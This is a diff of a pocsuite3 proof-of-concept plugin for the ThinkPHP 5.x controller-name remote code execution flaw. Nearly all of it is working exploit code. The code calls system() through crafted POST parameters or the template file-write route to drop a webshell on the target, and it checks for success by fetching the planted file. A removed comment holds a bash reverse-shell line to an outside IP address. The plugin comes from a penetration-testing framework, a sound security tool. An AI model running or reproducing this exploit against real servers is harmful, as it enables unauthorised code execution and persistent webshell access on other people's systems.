@@ -6,7 +6,7 @@ for more about information, plz visit http://pocsuite.org
 from collections import OrderedDict
 from urllib.parse import quote
 
-from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict
+from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE
 from pocsuite3.lib.utils import random_str
 
 
@@ -22,7 +22,7 @@ class DemoPOC(POCBase):
     appPowerLink = 'http://www.thinkphp.cn/'
     appName = 'thinkphp'
     appVersion = 'thinkphp5.1.31'
-    vulType = 'Code Execution'
+    vulType = VUL_TYPE.CODE_EXECUTION
     desc = '''ThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严重的远程代码执行漏洞。该更新主要涉及一个安全更新
     ，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。'''
     samples = []
@@ -83,28 +83,17 @@ class DemoPOC(POCBase):
                                                                                  content=quote(webshell))
             data["vars[0]"] = "system"
             vulurl = self.url + p[0]
-            post_r = requests.post(vulurl, data=data)
-            data_function_value = data["function"]
-            data_vars0_value = data["vars[0]"]
-            data_vars1_value = data["vars[1][]"]
-            get_string = "&" + "function" + "=" + data_function_value + "&" + "vars[0]" + "=" + data_vars0_value + "&" + "vars[1][]"  + "=" + data_vars1_value
-            r = requests.get(vulurl + get_string)
-            r1 = requests.get(self.url + "/" + filename)
-            if r1.status_code == 200 and "green day" in r1.text:
+            requests.post(vulurl, data=data)
+            r = requests.get(self.url + "/" + filename)
+            if r.status_code == 200 and "green day" in r.text:
                 result['ShellInfo'] = {}
                 result['ShellInfo']['URL'] = self.url + "/" + filename
                 result['ShellInfo']['Content'] = webshell
         if not result:
-            #vulurl = self.url + r"/index.php?s=index/\think\template\driver\file/write&cacheFile={filename}&content={content}"
-            #vulurl = vulurl.format(filename=filename, content=quote(webshell))
-            data = p[1]
-            data["vars[1][]"] = "echo%20%27{content}%27%20>%20{filename}".format(filename=filename,
-                                                                                 content=quote(webshell))
-            data["vars[0]"] = "system"
-            vulurl = self.url + p[0]
-			#requests.get(vulurl)
+            vulurl = self.url + r"/index.php?s=index/\think\template\driver\file/write&cacheFile={filename}&content={content}"
+            vulurl = vulurl.format(filename=filename, content=quote(webshell))
+            requests.get(vulurl)
             r = requests.get(self.url + "/" + filename)
-			#r = requests.get(vulurl + "&" + data)
             if r.status_code == 200 and "green day" in r.text:
                 result['ShellInfo'] = {}
                 result['ShellInfo']['URL'] = self.url + "/" + filename
@@ -113,8 +102,7 @@ class DemoPOC(POCBase):
         return self.parse_output(result)
 
     def _shell(self):
-        #cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
-        #sh -i >& /dev/tcp/192.168.186.1/10010 0>&1
+        # cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
         cmd = self.get_option("command")
         p = self._check(self.url)
         if p:
